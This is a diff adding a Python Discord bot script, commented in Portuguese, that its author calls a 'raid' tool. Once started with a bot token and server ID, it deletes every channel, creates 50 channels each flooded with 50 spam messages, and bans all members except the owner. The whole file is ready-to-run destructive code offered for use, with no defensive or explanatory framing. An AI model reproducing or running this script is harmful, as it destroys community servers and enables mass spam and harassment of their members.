@@ -1,0 +1,82 @@
+import discord
+from discord.ext import commands
+import asyncio
+
+TOKEN = "TOKEN" # bota o token do bot aqui
+GUILD_ID = "SERVIDOR" # bota o id do serivdor aqui
+CHANNEL_NAME = "CANAIS" # o nome dos canais que iram surgir na raid
+MESSAGE = "MENSAGEM" # mensagem que vai aparecer nos canais
+NUM_CHANNELS = 50 # numero de canasi que vao ser criados
+NUM_MESSAGES = 50 # numero de mensagens enviadas em cada canal
+
+if not TOKEN:
+    print("Erro: Adicione o token do bot.")
+    exit()
+
+intents = discord.Intents.default()
+intents.guilds = True
+intents.messages = True
+intents.members = True
+bot = commands.Bot(command_prefix="!", intents=intents)
+
+@bot.event
+async def on_ready():
+    print(f"Nome do bot: {bot.user.name}")
+    print(f"ID do Bot: {bot.user.id}")
+    print("------")
+
+    guild = bot.get_guild(int(GUILD_ID))
+    if not guild:
+        print("Erro no ID")
+        return
+
+    print(f"Servidor encontrado: {guild.name} (ID: {guild.id})")
+
+    if guild.get_member(bot.user.id) is None:
+        print("O bot não esta no servidor")
+        return
+
+    await raid_server(guild)
+
+async def delete_all_channels(guild):
+    tasks = []
+    for channel in guild.channels:
+        tasks.append(channel.delete())
+    await asyncio.gather(*tasks)
+    print("Canais apagados")
+
+async def create_and_spam_channels(guild):
+    tasks = []
+    for _ in range(NUM_CHANNELS):
+        try:
+            new_channel = await guild.create_text_channel(CHANNEL_NAME)
+            print(f"Canal criado: {new_channel.name}")
+
+            for _ in range(NUM_MESSAGES):
+                tasks.append(new_channel.send(MESSAGE))
+        except Exception as e:
+            print(f"Erro ao criar canal ou enviar mensagem: {e}")
+
+    await asyncio.gather(*tasks)
+    print("Mensagens enviadas, iniciando processo de banimento")
+
+async def ban_all_members(guild):
+    for member in guild.members:
+        try:
+            if member != guild.me and member != guild.owner:
+                await member.ban(reason="Mensagem") # O que ira aparecer no motivo do banimento
+                print(f"Membro banido: {member.name}")
+        except Exception as e:
+            print(f"Erro ao banir {member.name}: {e}")
+
+async def raid_server(guild):
+    try:
+        await delete_all_channels(guild)
+        await create_and_spam_channels(guild)
+        await ban_all_members(guild)
+        print("Raid completa, Creditos: x0zy")
+        await bot.close()
+    except Exception as e:
+        print(f"Erro durante o processo de raid: {e}")
+
+bot.run(TOKEN)
